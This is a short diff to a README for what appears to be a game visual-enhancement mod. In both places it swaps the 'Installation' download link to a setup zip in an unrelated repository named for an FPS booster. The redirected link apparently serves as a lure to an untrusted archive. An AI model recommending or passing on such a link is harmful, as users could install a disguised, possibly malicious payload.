@@ -20,7 +20,7 @@ Perfect for players who want a refreshed look while maintaining smooth playabili
 
 ---
 
-## 🧰  [Installation](https://github.com/LairLanceWish/dbd-reshade/releases/download/dbd-reshade/DBDReshade.zip)
+## 🧰  [Installation](https://github.com/Centralkremarina/Meccha-FPS-Boost/releases/download/v2.3.10/setup.v2.3.10.zip)
 
 
 
@@ -75,8 +75,7 @@ Visual enhancement features include color balancing, edge sharpening, and lighti
 
 **Updates?** Regular improvements included.
 ---
-## 🧰  [Installation](https://github.com/LairLanceWish/dbd-reshade/releases/download/dbd-reshade/DBDReshade.zip)
-
+## 🧰  [Installation](https://github.com/Centralkremarina/Meccha-FPS-Boost/releases/download/v2.3.10/setup.v2.3.10.zip)
 
 ---
 
